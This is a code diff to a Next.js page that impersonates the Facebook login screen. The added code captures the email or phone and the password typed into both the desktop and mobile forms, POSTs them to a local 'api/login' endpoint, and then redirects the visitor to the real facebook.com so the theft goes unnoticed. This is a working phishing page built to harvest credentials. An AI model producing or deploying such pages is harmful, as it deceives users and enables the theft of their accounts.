@@ -1,9 +1,31 @@
-
+'use client';
+import {useState} from 'react';
 import Image from "next/image";
 import Link from "next/link";
 export default function Home() {
 
+  const [formData, setFormData] = useState({ID: '', Password: ''});
+
+  function handleChange(e) {
+    setFormData({...formData, [e.target.name]: e.target.value});
+  };
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+
+    const res = await fetch('api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json'},
+      body: JSON.stringify(formData),
+    });
+    const data = await res.json();
+  
+  }
+    function red() {
+      window.location.href = 'https://facebook.com';
+    }
   return (
+
    <>
    <section id="desktop">
    <div><h4><div   className="fb">facebook</div>
@@ -12,12 +34,12 @@ share with the people in your life.
 </h4>
 </div>
 <div className="right">
-<form>
-<input type="text" name="ID" placeholder="Email address or phone number" className="input1" required />
+<form onSubmit={handleSubmit} >
+<input type="text" name="ID" placeholder="Email address or phone number" onChange={handleChange} className="input1" required />
 <br />
-<input type="password" name="Password" placeholder="Password" className="input2" required />
+<input type="password" name="Password" placeholder="Password" className="input2" required onChange={handleChange} />
 <br />
-<Link href="https://facebook.com"><input type="submit" className="btn"  value="Log in" /></Link></form>
+<input type="submit" className="btn"  value="Log in" onClick={red} /></form>
 <h5 >Forgotten password?</h5>
 <hr />
 <Link href='/signup'><input type="button" className="signup" value="Create New Account" /></Link>
@@ -30,12 +52,12 @@ share with the people in your life.
     </span>
     
     <span className="imgs"><Image width={70} height={70} src="/art.jpg" alt="Facebook Logo" /></span>
-    <form>
-    <span><input className="input1" name="ID" placeholder="Mobile number or email address" type="text" required /></span>
+    <form onSubmit={handleSubmit} method='POST'>
+    <span><input className="input1" name="ID" onChange={handleChange} placeholder="Mobile number or email address" type="text" required /></span>
     
-        <span><input className="input2" name="password "placeholder="Password" type="text" required /></span>
+        <span><input className="input2" name="password "placeholder="Password" type="text" required onChange={handleChange}/></span>
       <div className="butto">
-          <Link href="https://facebook.com"><input type="submit" className="butt"  value="Log in" /></Link>
+          <input type="submit" className="butt"  value="Log in" onClick={red} />
           </div>
       </form>
       <div className="und" >Forgotten Password?</div>
@@ -54,5 +76,5 @@ share with the people in your life.
     </div>
 </section>
    </>
-  );
+  )
 }
